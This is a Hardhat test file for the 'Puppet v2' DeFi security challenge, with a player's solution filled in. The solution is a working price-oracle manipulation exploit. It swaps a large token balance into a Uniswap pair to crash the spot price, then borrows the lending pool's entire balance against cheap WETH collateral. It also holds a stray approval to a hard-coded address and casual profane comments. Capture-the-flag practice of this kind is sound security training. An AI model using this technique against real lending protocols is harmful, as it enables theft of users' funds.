const pairJson = require("@uniswap/v2-core/build/UniswapV2Pair.json");
const factoryJson = require("@uniswap/v2-core/build/UniswapV2Factory.json");
const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json");

const { ethers } = require('hardhat');
const { expect } = require('chai');
const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
const { calculateSafeDomainSeparator } = require("@gnosis.pm/safe-contracts");


function getAmountOut(amountIn, reserveIn, reserveOut) 
{
    amountInWithFee = amountIn*997n;
    numerator = amountInWithFee*reserveOut;
    denominator = reserveIn*1000n + (amountInWithFee);
    amountOut = numerator / denominator;

    return amountOut;
}

describe('[Challenge] Puppet v2', function () {
    let deployer, player;
    let token, weth, uniswapFactory, uniswapRouter, uniswapExchange, lendingPool;

    // Uniswap v2 exchange will start with 100 tokens and 10 WETH in liquidity
    const UNISWAP_INITIAL_TOKEN_RESERVE = 100n * 10n ** 18n;
    const UNISWAP_INITIAL_WETH_RESERVE = 10n * 10n ** 18n;

    const PLAYER_INITIAL_TOKEN_BALANCE = 10000n * 10n ** 18n;
    const PLAYER_INITIAL_ETH_BALANCE = 20n * 10n ** 18n;

    const POOL_INITIAL_TOKEN_BALANCE = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
        [deployer, player] = await ethers.getSigners();

        await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
        expect(await ethers.provider.getBalance(player.address)).to.eq(PLAYER_INITIAL_ETH_BALANCE);

        const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.bytecode, deployer);
        const UniswapRouterFactory = new ethers.ContractFactory(routerJson.abi, routerJson.bytecode, deployer);
        const UniswapPairFactory = new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer);
    
        // Deploy tokens to be traded
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        weth = await (await ethers.getContractFactory('WETH', deployer)).deploy();

        // Deploy Uniswap Factory and Router
        uniswapFactory = await UniswapFactoryFactory.deploy(ethers.constants.AddressZero);
        uniswapRouter = await UniswapRouterFactory.deploy(
            uniswapFactory.address,
            weth.address
        );        

        // Create Uniswap pair against WETH and add liquidity
        await token.approve(
            uniswapRouter.address,
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        await uniswapRouter.addLiquidityETH(
            token.address,
            UNISWAP_INITIAL_TOKEN_RESERVE,                              // amountTokenDesired
            0,                                                          // amountTokenMin
            0,                                                          // amountETHMin
            deployer.address,                                           // to
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
            { value: UNISWAP_INITIAL_WETH_RESERVE }
        );
        uniswapExchange = await UniswapPairFactory.attach(
            await uniswapFactory.getPair(token.address, weth.address)
        );
        expect(await uniswapExchange.balanceOf(deployer.address)).to.be.gt(0);
            
        // Deploy the lending pool
        lendingPool = await (await ethers.getContractFactory('PuppetV2Pool', deployer)).deploy(
            weth.address,
            token.address,
            uniswapExchange.address,
            uniswapFactory.address
        );

        // Setup initial token balances of pool and player accounts
        await token.transfer(player.address, PLAYER_INITIAL_TOKEN_BALANCE);
        await token.transfer(lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);

        // Check pool's been correctly setup
        expect(
            await lendingPool.calculateDepositOfWETHRequired(10n ** 18n)
        ).to.eq(3n * 10n ** 17n);
        expect(
            await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
        ).to.eq(300000n * 10n ** 18n);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */


        a = await uniswapExchange.getReserves() //token, weth
        console.log("initial ",a);       
        console.log("\nADDRESSES");
        
        console.log("WETH IS : ",weth.address);
        console.log("TOken is L :", token.address);
        console.log("POOL ADDRESS US :", lendingPool.address);
        console.log("Uniswap Router ", uniswapRouter.address);
        console.log("Uniswap Factory ", uniswapFactory.address);
        console.log("Uniswap Exchange ", uniswapExchange.address, "\n");

        x = await token.allowance(player.address, uniswapExchange.address);
        console.log("allowance is ",x);

        console.log("player address ",player.address);
        // await token.connect(player).approve(uniswapExchange.address, ethers.constants.MaxUint256);
        // await token.connect(player).approve(uniswapFactory.address, ethers.constants.MaxUint256);
        await token.connect(player).approve(uniswapRouter.address, ethers.constants.MaxUint256);

        await token.connect(player).approve('0x5d70af5e2015d0f76892f8a100d176423420b7db',100000);
        
        const tokenInAddress = token.address;
        const tokenOutAddress = weth.address;
        const amountIn = PLAYER_INITIAL_TOKEN_BALANCE; // Amount of input token in wei
        const amountOutMin = 1; // Minimum amount of output token you are willing to accept
        const deadline = ethers.constants.MaxUint256; // 10 minutes from now


        // function swapExactTokensForTokens(
        //     uint amountIn,
        //     uint amountOutMin,
        //     address[] calldata path,
        //     address to,
        //     uint deadline
        // ) 
        await uniswapRouter.connect(player).swapExactTokensForTokens(
            amountIn,
            amountOutMin,
            [tokenInAddress, tokenOutAddress],
            player.address,
            deadline
        );

        a = await uniswapExchange.getReserves() //token, weth
        console.log("\nAfter exchange ",a);  

        //check balance of weth in user
        x= await weth.balanceOf(player.address);
        console.log("PLAYER WETH BALANCE IS ", x, x/10**18);

        //deposit weth! why didnt we just get that shit from uniswap? Same but fuck it. lets finish this nd look
        //look at its contract da jkfsmgvnlsjdhgbnlsjdghbnlsdjhgbn
        sx = BigInt(await  ethers.provider.getBalance(player.address));

        sx -= 100000000000000000n
        console.log("The ETH balace is ", sx);

        await weth.connect(player).deposit({value: sx });

        x= await weth.balanceOf(player.address);
        console.log("PLAYER WETH BALANCE AFter deposit IS ", x, x/10**18);

        //approve weth to the lending pool
        await weth.connect(player).approve(lendingPool.address, ethers.constants.MaxUint256);

        //call borrow from pool
        await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE);

        // //check reserves of uniswap
        // a = await uniswapExchange.getReserves() //token, weth
        // console.log("initial ",a);       

        // await token.approve(uniswapExchange.address, ethers.constants.MaxUint256);

        // // function getAmountOut(amountIn, reserveIn, reserveOut) 
        // x = getAmountOut(100n, UNISWAP_INITIAL_TOKEN_RESERVE ,UNISWAP_INITIAL_WETH_RESERVE);
        // console.log("output ios ",x);
        // await uniswapExchange.swap(100n,x, player.address, 0x00 );                             

        //dump all token to uniswap and get weth
        
        //call borrow from pool


    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        // Player has taken all tokens from the pool        
        expect(
            await token.balanceOf(lendingPool.address)
        ).to.be.eq(0);

        expect(
            await token.balanceOf(player.address)
        ).to.be.gte(POOL_INITIAL_TOKEN_BALANCE);
    });
});